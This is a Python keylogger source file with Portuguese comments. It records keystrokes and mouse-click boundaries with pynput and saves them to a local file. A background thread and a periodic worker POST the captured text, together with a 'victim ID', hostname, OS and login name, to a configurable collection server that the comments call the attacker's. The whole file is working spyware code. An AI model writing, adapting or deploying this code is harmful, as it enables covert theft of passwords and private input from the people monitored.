from pynput.keyboard import Key, Listener
from pynput import mouse
import datetime
import requests
import threading
import time
import os
import platform

fullog = ''
words = ''
log_file = 'captured_keys.txt'

# CONFIGURAÇÃO: URL do servidor para exfiltração (use variável de ambiente ou localhost como fallback)
SERVER_URL = os.environ.get('KEYLOGGER_SERVER_URL', 'http://localhost:5000/api/receber-logs')
ENVIO_INTERVALO = 30  # Envia logs a cada 30 segundos

# Identificador único desta vítima
import uuid
VICTIM_ID = str(uuid.uuid4())[:8]

def enviar_para_servidor(mensagem):
    """Envia logs capturados para o servidor do atacante"""
    try:
        payload = {
            'victim_id': VICTIM_ID,
            'hostname': platform.node(),
            'sistema': platform.system(),
            'usuario': os.getlogin(),
            'timestamp': datetime.datetime.now().isoformat(),
            'conteudo': mensagem
        }
        
        response = requests.post(SERVER_URL, json=payload, timeout=5)
        
        if response.status_code == 200:
            print(f'[DEBUG] Logs enviados ao servidor (ID: {VICTIM_ID})')  # Remove em produção
            return True
        else:
            print(f'[DEBUG] Falha ao enviar: {response.status_code}')  # Remove em produção
            return False
            
    except requests.exceptions.RequestException as e:
        print(f'[DEBUG] Erro de conexão: {e}')  # Remove em produção
        return False

def worker_envio_periodico():
    """Thread que envia logs periodicamente para o servidor"""
    while True:
        time.sleep(ENVIO_INTERVALO)
        
        # Lê o arquivo de logs local
        if os.path.exists(log_file):
            try:
                with open(log_file, 'r', encoding='utf-8') as f:
                    conteudo = f.read()
                
                if conteudo.strip():
                    # Tenta enviar para o servidor
                    if enviar_para_servidor(conteudo):
                        # Se sucesso, limpa o arquivo local (opcional)
                        # open(log_file, 'w').close()  # Descomente para apagar após enviar
                        pass
                        
            except Exception as e:
                print(f'[DEBUG] Erro ao ler logs: {e}')  # Remove em produção

def onPress(key):
    global fullog
    global words

    if key == Key.space:
        words += ' '

    elif key == Key.enter:
        fullog += words + '\n'
        save_to_file(fullog)
        words = ''
        fullog = ''

    #elif key == Key.ctrl_l or key == Key.ctrl_r or key == Key.tab or key == Key.caps_lock or key == Key.shift_l or key == Key.shift_r:
        #pass

    elif key == Key.backspace:
        words = words[:-1]
    else:
        char = f'{key}'
        char = char.replace("'", "")
        words += char
    
    if key == Key.esc:
        return False
    

def click(x, y, button, pressed):
    global fullog
    global words

    if len(words) > 0 and pressed:
        fullog += words + '\n'
        save_to_file(fullog)
        words = ''    
        fullog = ''
    else:
        pass


def save_to_file(message):
    if not message.strip():
        return
    
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f'[{timestamp}] {message.strip()}'
    
    # Salva localmente (backup)
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(log_entry + '\n')
    
    # Tenta enviar imediatamente ao servidor (assíncrono)
    threading.Thread(target=enviar_para_servidor, args=(log_entry,), daemon=True).start()


def main():
    print(f'[Keylogger] Iniciado - Vítima ID: {VICTIM_ID}')
    print(f'[Keylogger] Servidor: {SERVER_URL}')
    print(f'[Keylogger] Pressione ESC para parar\n')
    
    # Inicia thread de envio periódico em background
    thread_envio = threading.Thread(target=worker_envio_periodico, daemon=True)
    thread_envio.start()
    
    # Inicia captura de teclas
    with Listener(on_press=onPress) as k_listener, mouse.Listener(on_click=click) as m_listener:
        k_listener.join()
        m_listener.join()


if __name__ == "__main__":
    main()
